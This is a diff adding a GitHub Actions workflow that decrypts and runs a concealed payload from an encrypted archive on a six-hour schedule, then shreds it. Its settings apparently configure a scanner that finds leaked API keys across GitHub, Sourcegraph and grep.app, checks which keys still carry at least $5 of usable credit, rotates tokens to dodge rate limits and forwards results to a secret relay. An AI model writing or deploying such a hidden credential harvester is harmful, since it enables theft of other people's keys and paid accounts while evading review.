@@ -1,0 +1,171 @@
+name: shard sync
+
+# Scheduled worker. Materializes the encrypted shard (shard/blob.enc) inside
+# an ephemeral runner, executes its payload, and destroys every artifact when
+# the job ends. The schedule is gated by the ENABLE_SCHEDULE repository
+# variable ('1' = cron active); dispatches are always allowed.
+
+on:
+  schedule:
+    # every 6h; the concurrency group guarantees no overlap
+    - cron: "41 */6 * * *"
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: "full | smoke (materialize + self-check only)"
+        default: "full"
+        required: false
+      sources:
+        description: "comma separated sources"
+        default: ""
+        required: false
+      deep:
+        description: "include deep pass"
+        type: boolean
+        default: false
+        required: false
+      budget:
+        description: "run budget in seconds"
+        default: "19800"
+        required: false
+  repository_dispatch:
+    types: [sync]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: shard-sync
+  cancel-in-progress: false
+
+jobs:
+  scan:
+    if: github.event_name != 'schedule' || vars.ENABLE_SCHEDULE == '1'
+    runs-on: ubuntu-latest
+    timeout-minutes: 355   # platform hard cap is 360; stay just under
+    env:
+      # comma-separated token pool (each token = its own rate buckets).
+      # Secret names may not start with GITHUB_, hence API_TOKENS; falls
+      # back to the automatic workflow token.
+      GITHUB_TOKENS: ${{ secrets.API_TOKENS || secrets.GITHUB_TOKEN }}
+      SOURCEGRAPH_TOKEN: ${{ secrets.SOURCEGRAPH_TOKEN }}
+      DATABASE_URL: ${{ secrets.DATABASE_URL }}
+      VALIDATOR_CONCURRENCY: "24"
+      VALIDATOR_PER_PROVIDER: "6"
+      MAX_VALIDATE_PER_RUN: "4000"
+      REVALIDATE_AFTER_DAYS: "7"
+      ENRICH_RAW_FILES: "true"
+      ENRICH_MAX_FILES: "2500"
+      MAX_CHUNKS_PER_SOURCE: "60000"
+      MAX_PAGES: "10"
+      FRESH_REPOS_MAX: "600"
+      HISTORY_MAX_REPOS: "300"
+      HISTORY_MAX_COMMITS_PER_RUN: "12000"
+      HISTORY_LOOKBACK_DAYS: "7"
+      ALLOW_COSTLY_VALIDATION: "true"
+      SEARCH_DISABLED_PROVIDERS: "openai,anthropic"
+      PROBE_GENERATION: "true"
+      MIN_USABLE_USD: "5.0"
+      RELAY_URL: ${{ secrets.RELAY_URL || '' }}
+      RELAY_SECRET: ${{ secrets.RELAY_SECRET || '' }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Materialize workspace
+        env:
+          BUNDLE_KEY: ${{ secrets.BUNDLE_KEY }}
+        run: |
+          [ -n "$BUNDLE_KEY" ] || { echo "::error::BUNDLE_KEY secret is not set"; exit 1; }
+          printf '%s' "$BUNDLE_KEY" | openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 \
+            -in shard/blob.enc -out blob.tar.gz -pass stdin
+          tar -xzf blob.tar.gz -C .
+          shred -u blob.tar.gz 2>/dev/null || rm -f blob.tar.gz
+          echo "workspace materialized"
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+          cache: pip
+
+      - name: Install
+        run: |
+          python -m pip install -U pip
+          pip install -r requirements.txt
+          pip install "psycopg[binary]>=3.1" || echo "postgres driver unavailable, using sqlite"
+
+      - name: Self-check
+        if: github.event.inputs.mode == 'smoke'
+        run: |
+          pip install -r requirements-dev.txt
+          python -m pytest -q 2>&1 | tail -2
+          python -c "import app.cli, app.config; print('imports OK')"
+          echo "SELF_CHECK_OK"
+
+      # Dispatch inputs are untrusted: routed through env, allow-listed, never
+      # interpolated into the script body.
+      - name: Resolve inputs
+        if: github.event.inputs.mode != 'smoke'
+        id: cfg
+        env:
+          INPUT_SOURCES: ${{ github.event.inputs.sources || '' }}
+          INPUT_DEEP: ${{ github.event.inputs.deep || 'false' }}
+          PAYLOAD_DEEP: ${{ github.event.client_payload.deep || 'false' }}
+          INPUT_BUDGET: ${{ github.event.inputs.budget || '19800' }}
+        run: |
+          SRC=""
+          for name in $(printf '%s' "$INPUT_SOURCES" | tr ',' '\n'); do
+            name="$(printf '%s' "$name" | tr -d '[:space:]')"
+            case "$name" in
+              github_search|grepapp|sourcegraph|events|history|issues|commits|fresh_repos)
+                if [ -z "$SRC" ]; then SRC="$name"; else SRC="$SRC,$name"; fi ;;
+              '') ;;
+              *) echo "ignoring unknown source: $name" ;;
+            esac
+          done
+          # scheduled runs (no inputs) default to the full source set
+          [ -n "$SRC" ] || SRC="github_search,issues,commits,fresh_repos,events,history"
+          if [ "$INPUT_DEEP" = "true" ] || [ "$PAYLOAD_DEEP" = "true" ]; then
+            case ",$SRC," in *,events,*) ;; *) SRC="$SRC,events" ;; esac
+            case ",$SRC," in *,history,*) ;; *) SRC="$SRC,history" ;; esac
+          fi
+          case "$INPUT_BUDGET" in
+            ''|*[!0-9]*) echo "::error::budget must be an integer, got '$INPUT_BUDGET'" && exit 1 ;;
+            *) BUDGET="$INPUT_BUDGET" ;;
+          esac
+          echo "sources=$SRC" >> "$GITHUB_OUTPUT"
+          echo "budget=$BUDGET" >> "$GITHUB_OUTPUT"
+
+      - name: Check storage config
+        if: github.event.inputs.mode != 'smoke'
+        run: |
+          if [ -z "$DATABASE_URL" ]; then
+            echo "::warning::DATABASE_URL secret is not set - results are discarded when the job ends."
+          else
+            echo "persistent database configured"
+          fi
+
+      - name: Preflight
+        if: github.event.inputs.mode != 'smoke'
+        continue-on-error: true
+        run: python -m app.cli doctor
+
+      # Pre-flight: measure a batch of plan queries into the persistent stats
+      # table so zero-yield entries go dormant and the plan keeps re-verifying.
+      - name: Audit query plan
+        if: github.event.inputs.mode != 'smoke'
+        continue-on-error: true
+        run: python -m app.tools.audit_queries --max 120 --refresh-hours 336 --pace 1 --e1 2
+
+      - name: Run
+        if: github.event.inputs.mode != 'smoke'
+        env:
+          SOURCES: ${{ steps.cfg.outputs.sources }}
+          RUN_BUDGET_SECONDS: ${{ steps.cfg.outputs.budget }}
+        run: python -m app.cli run --sources "$SOURCES" --budget "$RUN_BUDGET_SECONDS"
+
+      - name: Summary
+        if: always() && github.event.inputs.mode != 'smoke'
+        run: |
+          python -m app.cli stats
+          python -m app.cli runs -n 5
